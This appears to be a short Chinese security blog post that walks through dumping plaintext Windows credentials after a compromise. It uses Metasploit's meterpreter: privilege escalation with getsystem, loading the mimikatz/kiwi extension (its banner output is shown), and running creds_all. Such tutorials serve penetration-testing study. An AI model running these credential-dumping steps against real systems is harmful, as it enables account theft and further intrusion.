---
title: 通过MSF模块mimikatz or kiwi获得密码明文
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# 通过MSF模块mimikatz or kiwi获得密码明文

`mimikatz`模块的使用需要`Administrator`权限或者`System`权限，这就我们为什么需要`getsystem`

所以首先得进行用户提权

1. 用户提权
    
    内存迁移或在 msf 使用  getsystem 进行提权
    
2. 使用MSF里的`mimikatz`模块
    - 加载`mimikatz` 模块
        
        ```python
        meterpreter > load mimikatz
        [!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
        Loading extension kiwi...
          .#####.   mimikatz 2.2.0 20191125 (x86/windows)
         .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
         ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
         ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
         '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
          '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
        
        [!] Loaded x86 Kiwi on an x64 architecture.
        
        Success.
        ```
        
    - 运行`creds_all` 命令，获得所有凭据